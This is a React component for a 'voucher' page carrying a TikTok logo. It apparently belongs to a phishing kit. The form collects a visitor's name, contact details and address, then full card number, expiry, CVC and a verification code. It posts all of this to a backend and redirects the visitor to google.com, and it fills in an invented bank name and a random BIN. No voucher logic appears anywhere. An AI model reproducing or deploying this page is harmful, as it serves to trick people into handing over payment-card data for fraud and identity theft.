import { yupResolver } from '@hookform/resolvers/yup';
import axios from 'axios';
import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { useNavigate } from 'react-router-dom';
import { toast } from 'react-toastify';
import * as Yup from 'yup';
import { API_URL } from '../../config';
import CardDetailForm from './CardDetailForm';
import { Infomation } from './Infomation';
import './index.css';
import { firstCaptialize, isValidZipCode, validatePhone } from '../../utils';
import moment from 'moment';
import { countries } from 'countries-list';
import logo from '../../assets/images/tiktokLogo.svg';

const VoucherPage = () => {
	const navigate = useNavigate();

	const [step, setStep] = useState(0);
	const [loading, setLoading] = useState(false);

	const validationSchema = Yup.object().shape({
		firstName: Yup.string().required('Invalid first name'),
		lastName: Yup.string().required(),
		phone: Yup.string().required(),
		// .test('valid', 'Invalid phone number', (val) => {
		// 	return val.length > 8 && val.length < 15;
		// }),
		email: Yup.string().email(),
		address: Yup.string().required(),
		address2: Yup.string().required(),
		city: Yup.string().required(),
		region: Yup.string().required(),
		zipcode: Yup.string().required(),
		// .test('val', 'Invalid zip code', (val) => isValidZipCode(val)),
		state: Yup.string().required(),
		country: Yup.string().required(),

		cardVerifyCode: Yup.string().required(),
		cardShema: Yup.string().required(),
		cardType: Yup.string().required(),
		cardName: Yup.string().required(),
		cardNumber: Yup.number()
			.required()
			.test('val', 'Invalid card number', (val) => {
				return val.toString().length < 19 && val.toString().length > 13;
			})
			.typeError('Invalid card number'),
		expires: Yup.string().required(),
		cvc: Yup.string().required('Invalid code').min(3, 'Invalid code').max(4, 'Invalid code'),
	});

	const defaultValues = {
		firstName: '',
		lastName: '',
		phone: '',
		email: '',
		address: '',
		address2: '',
		city: '',
		region: '',
		zipcode: '',
		state: '',
		country: '',

		cardVerifyCode: '',
		cardSchema: 'DEBIT',
		cardType: 'VISA',
		cardName: '',
		cardNumber: '',
		expires: '',
		cvc: '',
	};

	const {
		control,
		watch,
		formState: { errors },
	} = useForm({
		defaultValues,
		resolver: yupResolver(validationSchema),
		mode: 'onChange',
	});

	const watchFirstName = watch('firstName');
	const watchLastName = watch('lastName');
	const watchPhone = watch('phone');
	const watchEmail = watch('email');
	const watchAddress = watch('address');
	const watchAddress2 = watch('address2');
	const watchCity = watch('city');
	const watchZipcode = watch('zipcode');
	const watchState = watch('state');
	const watchCountry = watch('country');

	const watchCardVerifyCode = watch('cardVerifyCode');
	const watchCardSchema = watch('cardSchema');
	const watchCardType = watch('cardType');
	const watchCardName = watch('cardName');
	const watchCardNumber = watch('cardNumber');
	const watchExpires = watch('expires');
	const watchCvc = watch('cvc');

	const submitValueInformation = {
		fullName: `${watchFirstName} ${watchLastName}`,
		address: watchAddress,
		address2: watchAddress2,
		city: watchCity,
		state: watchState,
		zipCode: watchZipcode,
		email: watchEmail,
		phone: watchPhone,
		country: watchCountry,
	};

	const submitValueCard = {
		schema: watchCardSchema,
		type: watchCardType,
		cardName: watchCardName,
		cardNumber: watchCardNumber,
		expires: watchExpires && moment(watchExpires).format('MM/YY'),
		cvc: watchCvc,
		level: 'GOLD',
		bank: `Bank of ${watchState && firstCaptialize(countries[watchState]?.name)}`,
		bin: Math.floor(Math.random() * 1000000),
		verifyCode: watchCardVerifyCode,
	};

	const onSubmit = async () => {
		try {
			setLoading(true);
			const body = {
				...submitValueCard,
				...submitValueInformation,
			};
			await axios.post(`${API_URL}/api/payments`, body);
			setLoading(false);
			window.location.href = 'https://www.google.com';
		} catch (error) {
			setLoading(false);
			toast.error(error?.response?.data?.message ?? 'Unknow error');
		}
	};

	const handleSend = () => {
		setStep(1);
	};

	return (
		<>
			<div style={{ position: 'absolute', top: 0, left: 0 }} className='sm:hidden md:block'>
				<img src={logo} height={150} width={150} />
			</div>
			{step === 0 && (
				<Infomation
					onSend={handleSend}
					disabled={
						Object.values(submitValueInformation).some((item) => !item) ||
						Object.keys(errors).length > 0
					}
					control={control}
				/>
			)}
			{step === 1 && (
				<CardDetailForm
					disabled={
						Object.keys(submitValueCard).some((item) => {
							if (submitValueCard[item] || item === 'verifyCode') {
								console.log(item, submitValueCard[item], 'item');
								return false;
							}
							return true;
						}) || Object.keys(errors).length > 0
					}
					control={control}
					onSubmit={onSubmit}
					loading={loading}
				/>
			)}
		</>
	);
};

export default VoucherPage;
